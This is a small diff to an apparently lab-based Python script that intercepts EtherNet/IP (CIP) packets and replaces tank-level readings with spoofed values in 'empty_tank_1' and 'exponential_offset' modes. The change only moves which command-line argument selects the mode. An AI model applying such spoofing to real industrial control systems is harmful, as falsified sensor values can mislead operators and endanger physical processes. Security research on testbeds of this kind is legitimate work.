@@ -65,7 +65,7 @@ def capture(packet):
         print("Capturing...")
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
 
-        if sys.argv[2] == "empty_tank_1":
+        if sys.argv[3] == "empty_tank_1":
             if sys.argv[1] == '192.168.1.1':
                 pay = spoof_value(raw)
                 pkt[Raw].load = pay  # Replace the tank level with the spoofed one
@@ -83,7 +83,7 @@ def capture(packet):
                     __setdown(enip_port)
                     return 0
 
-        if sys.argv[2] == "exponential_offset":
+        if sys.argv[3] == "exponential_offset":
             if sys.argv[1] == '192.168.1.1':
                 pay = exponential_spoof(raw)
                 pkt[Raw].load = pay  # Replace the tank level with the spoofed one
